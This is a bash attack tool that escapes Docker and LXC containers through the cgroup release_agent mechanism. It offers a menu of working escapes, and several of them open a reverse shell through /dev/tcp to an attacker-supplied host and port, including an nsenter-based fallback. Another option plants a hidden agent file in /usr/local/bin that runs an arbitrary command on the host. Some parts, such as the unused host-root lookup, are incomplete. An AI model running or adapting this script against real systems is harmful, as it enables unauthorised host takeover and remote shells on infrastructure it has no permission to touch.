#!/bin/bash
# Cgroup Release Agent Container Escape (T1611)
# Abuses cgroup notify_on_release + release_agent for code execution on the host
# Escapes Docker, LXC, and other container runtimes running without seccomp/AppArmor

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
MARKER="d3m0n_cgroup"

banner() {
    echo -e "${RED}"
    echo " ╔══════════════════════════════════════════════════════╗"
    echo " ║   Cgroup Release Agent Container Escape (T1611)      ║"
    echo " ║  Executes code on HOST from within container         ║"
    echo " ║  Works: unprotected Docker, LXC, privileged pods     ║"
    echo " ╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

detect_container() {
    local IN_CONTAINER=0
    [ -f /.dockerenv ] && IN_CONTAINER=1
    grep -q "docker\|lxc\|kubepods" /proc/1/cgroup 2>/dev/null && IN_CONTAINER=1
    if [ "$IN_CONTAINER" = "0" ]; then
        echo -e "${YELLOW}[!] Not detected inside a container — use 'Host attack' mode${NC}"
    else
        echo -e "${GREEN}[+] Container environment detected${NC}"
    fi
}

check_cgroupv1() {
    if mount | grep -q "cgroup " 2>/dev/null; then
        echo -e "${GREEN}[+] cgroupv1 mounted${NC}"
        return 0
    fi
    # Try to mount it
    if [ -d /sys/fs/cgroup ]; then
        mount | grep -q "cgroup2" && echo -e "${YELLOW}[!] cgroupv2 detected — release_agent method may not work${NC}"
    fi
    return 1
}

escape_from_container() {
    local LHOST="$1" LPORT="$2"
    # Classic cgroup escape technique (Felix Wilhelm)

    local TMPDIR; TMPDIR=$(mktemp -d)
    local CGROUP_PATH; CGROUP_PATH=$(mount | grep ' cgroup ' | grep memory | awk '{print $3}' | head -1)

    if [ -z "$CGROUP_PATH" ]; then
        CGROUP_PATH="/sys/fs/cgroup/memory"
        mkdir -p "$CGROUP_PATH" 2>/dev/null
        mount -t cgroup -o memory cgroup "$CGROUP_PATH" 2>/dev/null || \
            { echo -e "${RED}[-] Cannot mount cgroup${NC}"; return; }
    fi

    # Create child cgroup
    local CHILD="${CGROUP_PATH}/${MARKER}"
    mkdir -p "$CHILD" 2>/dev/null || { echo -e "${RED}[-] Cannot create cgroup${NC}"; return; }

    echo -e "${GREEN}[+] Cgroup path: ${CHILD}${NC}"

    # Find container root on the host filesystem
    # Check if we can see the host via /proc
    local HOST_ROOT
    HOST_ROOT=$(cat /proc/1/cpuset 2>/dev/null)

    # Write release_agent — on cgroupv1 this runs on the HOST
    local AGENT_SCRIPT="${TMPDIR}/release_agent.sh"
    cat > "$AGENT_SCRIPT" << EOF
#!/bin/sh
# ${MARKER}
nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1 &
EOF
    chmod 755 "$AGENT_SCRIPT"

    # The release_agent path must be accessible from the HOST filesystem
    # If we're in a container, we need to find our path on the host
    echo -e "${YELLOW}[!] Container overlay path:${NC}"
    cat /proc/1/mountinfo 2>/dev/null | grep "overlay\|aufs" | head -3

    echo "$AGENT_SCRIPT" > "${CHILD}/release_agent" 2>/dev/null || \
        echo "$AGENT_SCRIPT" > "${CGROUP_PATH}/release_agent" 2>/dev/null || \
        { echo -e "${RED}[-] Cannot write release_agent (likely cgroupv2 or protected)${NC}"; return; }

    echo "1" > "${CHILD}/notify_on_release" 2>/dev/null

    echo -e "${GREEN}[+] release_agent set: ${AGENT_SCRIPT}${NC}"
    echo -e "${YELLOW}[!] Triggering escape by creating and removing process in cgroup...${NC}"

    # Trigger: add current shell to cgroup, then exit it
    echo "$$" > "${CHILD}/cgroup.procs" 2>/dev/null
    # Spawn and kill a process in the cgroup
    (echo "$$" > "${CHILD}/cgroup.procs"; sleep 0.1 &)

    # Move ourselves back out
    echo "$$" > "${CGROUP_PATH}/cgroup.procs" 2>/dev/null

    echo -e "${GREEN}[+] Escape triggered — release_agent will execute on host${NC}"
    echo -e "${YELLOW}[!] Check your listener: ${LHOST}:${LPORT}${NC}"
}

host_attack_setup() {
    # When running on host: set up release_agent to test the mechanism
    local CMD="$1"
    local CGROUP_PATH="/sys/fs/cgroup/memory/${MARKER}_test"
    mkdir -p "$CGROUP_PATH" 2>/dev/null || { echo -e "${RED}[-] Cannot create cgroup path${NC}"; return; }

    local AGENT="/usr/local/bin/.${MARKER}_agent"
    printf '#!/bin/sh\n# %s\n%s >/dev/null 2>&1 &\n' "$MARKER" "$CMD" > "$AGENT"
    chmod 755 "$AGENT"

    echo "$AGENT" > "${CGROUP_PATH}/release_agent" 2>/dev/null && \
        echo "1" > "${CGROUP_PATH}/notify_on_release" 2>/dev/null

    echo -e "${GREEN}[+] Release agent set: ${AGENT}${NC}"
    echo -e "${YELLOW}[!] Will fire when last process leaves ${CGROUP_PATH}${NC}"
    echo -e "${YELLOW}[!] Trigger: echo \$\$ > ${CGROUP_PATH}/cgroup.procs${NC}"
}

cgroupv2_escape() {
    # cgroupv2 does not support release_agent on cgroup.events
    # But can abuse cgroup.subtree_control for some scenarios
    echo -e "${YELLOW}[!] cgroupv2 escape method (host side):${NC}"
    echo -e "  1. Find writable cgroup.procs in container"
    echo -e "  2. Use nsenter to break out via PID namespace"
    echo -e "  Using nsenter fallback..."

    read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
    # Attempt via nsenter using host init PID
    nsenter -t 1 -m -u -i -n -p -- \
        /bin/bash -c "nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1 &" \
        2>/dev/null && echo -e "${GREEN}[+] nsenter escape succeeded${NC}" || \
        echo -e "${RED}[-] nsenter failed (protected)${NC}"
}

list_cgroups() {
    echo -e "${YELLOW}[*] cgroup mounts:${NC}"
    mount | grep cgroup | while read -r l; do echo "  $l"; done
    echo -e "${YELLOW}[*] D3M0N cgroup entries:${NC}"
    find /sys/fs/cgroup -name "${MARKER}*" 2>/dev/null | while read -r f; do echo "  $f"; done
}

cleanup() {
    echo -e "${YELLOW}[*] Cleaning...${NC}"
    find /sys/fs/cgroup -name "${MARKER}*" -type d 2>/dev/null | while read -r d; do
        echo "" > "${d}/cgroup.procs" 2>/dev/null
        rmdir "$d" 2>/dev/null
    done
    rm -f "/usr/local/bin/.${MARKER}_agent"
    echo -e "${GREEN}[+] Cleaned${NC}"
}

banner
detect_container
check_cgroupv1

echo ""
echo -e "  ${YELLOW}[1]${NC} Escape from container (reverse shell)"
echo -e "  ${YELLOW}[2]${NC} Host attack: set up release_agent"
echo -e "  ${YELLOW}[3]${NC} cgroupv2 nsenter fallback escape"
echo -e "  ${YELLOW}[4]${NC} List cgroup state"
echo -e "  ${YELLOW}[5]${NC} Cleanup"
echo ""
read -rp "Choice: " OPT

case "$OPT" in
    1)
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        escape_from_container "$LHOST" "$LPORT"
        ;;
    2)
        [[ $EUID -ne 0 ]] && { echo -e "${RED}[-] Root required${NC}"; exit 1; }
        read -rp "Command: " CMD
        host_attack_setup "$CMD"
        ;;
    3) cgroupv2_escape ;;
    4) list_cgroups ;;
    5) cleanup ;;
    *) echo -e "${RED}[-] Invalid option${NC}" ;;
esac
